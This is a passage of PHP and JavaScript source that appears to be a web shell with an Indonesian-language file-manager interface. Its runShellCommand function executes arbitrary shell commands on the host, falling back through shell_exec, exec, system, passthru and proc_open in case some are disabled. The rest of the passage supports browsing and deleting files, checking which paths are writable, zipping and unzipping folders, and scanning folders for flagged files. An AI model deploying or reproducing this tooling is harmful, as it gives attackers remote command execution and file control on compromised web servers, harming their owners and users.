function x($string) { return htmlspecialchars($string ?? '', ENT_QUOTES, 'UTF-8'); }
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    else return $bytes . ' B';
}
function permColor($path) {
    if (@is_writable($path)) return 'color:var(--primary);font-weight:bold;';
    elseif (@is_readable($path)) return 'color:#ffff00;font-weight:bold;';
    else return 'color:#ff4444;font-weight:bold;';
}
function runShellCommand($command) {
    $output = '';
    $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $inputPath = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();
    $currentPath = $isWindows ? str_replace('/', DIRECTORY_SEPARATOR, $inputPath) : str_replace('\\', DIRECTORY_SEPARATOR, $inputPath);
    $command = "cd " . escapeshellarg($currentPath) . " && " . $command . " 2>&1";
    if (function_exists('shell_exec')) { $output = shell_exec($command); }
    elseif (function_exists('exec')) { exec($command, $lines); $output = implode("\n", $lines); }
    elseif (function_exists('system')) { ob_start(); system($command); $output = ob_get_clean(); }
    elseif (function_exists('passthru')) { ob_start(); passthru($command); $output = ob_get_clean(); }
    elseif (function_exists('proc_open')) {
        $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[0]); fclose($pipes[2]);
            proc_close($process);
        }
    }
    return $output;
}
function file_path_to_url($file_path) {
    $doc_root = realpath($_SERVER['DOCUMENT_ROOT']);
    $real_path = realpath($file_path);
    if ($real_path === false || strpos($real_path, $doc_root) !== 0) return false;
    $relative = substr($real_path, strlen($doc_root));
    $relative = str_replace('\\', '/', $relative);
    $relative = ltrim($relative, '/');
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
    return $protocol . $_SERVER['HTTP_HOST'] . '/' . $relative;
}
function generate_random_string($length = 10, $prefix = 'RH') {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $random = '';
    $rand_length = $length - strlen($prefix);
    for ($i = 0; $i < $rand_length; $i++) $random .= $chars[random_int(0, strlen($chars) - 1)];
    return $prefix . $random;
}

<script>
function confirmDelete() { return confirm("Hapus file/folder ini?"); }

function showLoading() {
    document.getElementById('loadingOverlay').classList.add('active');
}

function hideLoading() {
    document.getElementById('loadingOverlay').classList.remove('active');
}

window.addEventListener('load', function() {
    hideLoading();
});

setTimeout(function() {
    if (document.querySelector('.flash')) {
        hideLoading();
    }
}, 500);

document.querySelectorAll('form').forEach(function(form) {
    form.addEventListener('submit', function() {
        showLoading();
    });
});

function unzipFile() {
    const zipPath = document.getElementById('zip_path').value;
    if (!zipPath) return alert('Pilih file ZIP!');
    showLoading();
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ action: 'unzip', zip_path: zipPath })
    })
    .then(res => res.json())
    .then(data => { alert(data.message); hideLoading(); })
    .catch(() => hideLoading());
}

function zipFolder() {
    const folder = document.getElementById('folder_to_zip').value;
    if (!folder) return alert('Pilih folder!');
    showLoading();
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ action: 'zip', folder_to_zip: folder })
    })
    .then(res => res.json())
    .then(data => { alert(data.message); hideLoading(); })
    .catch(() => hideLoading());
}

let ajaxFolders = [], offset = 0;
function startAjaxScan() {
    const base = prompt("Scan dari folder mana?", "<?php echo htmlspecialchars($currentPath); ?>");
    if (!base) return;
    document.getElementById('scan-result').innerHTML = '';
    document.getElementById('progress').innerText = '⏳ Mengumpulkan folder...';
    document.getElementById('progressBar').style.width = '0%';
    showLoading();
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ ajax_scan: 'collect', base })
    })
    .then(res => res.json())
    .then(data => {
        ajaxFolders = data.folders;
        offset = 0;
        ajaxScanStep(base);
    })
    .catch(() => hideLoading());
}

function ajaxScanStep(base) {
    if (offset >= ajaxFolders.length) {
        document.getElementById('progress').innerText = '✅ Scan selesai.';
        document.getElementById('progressBar').style.width = '100%';
        hideLoading();
        return;
    }
    const pct = Math.round((offset / ajaxFolders.length) * 100);
    document.getElementById('progressBar').style.width = pct + '%';
    document.getElementById('progress').innerText = `📂 ${offset+1} / ${ajaxFolders.length}`;
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ ajax_scan: 'step', path: ajaxFolders[offset] })
    })
    .then(res => res.json())
    .then(data => {
        if (data.output && data.output.length > 0) {
            const container = document.getElementById('scan-result');
            data.output.forEach(item => {
                const div = document.createElement('div');
                div.style.cssText = 'padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);font-size:14px;';
                div.innerHTML = `<span style="color:yellow;">${item.file}</span> 
                    <span style="background:${item.level==='TINGGI'?'#ff4444':'#ffaa00'};color:#000;padding:1px 8px;border-radius:4px;margin-left:6px;font-size:12px;">${item.level}</span>
                    <span style="font-size:12px;color:#888;margin-left:6px;">(${item.match})</span>`;
                container.appendChild(div);
            });
        }
        offset++;
        setTimeout(() => ajaxScanStep(base), 150);
    })
    .catch(() => hideLoading());
}
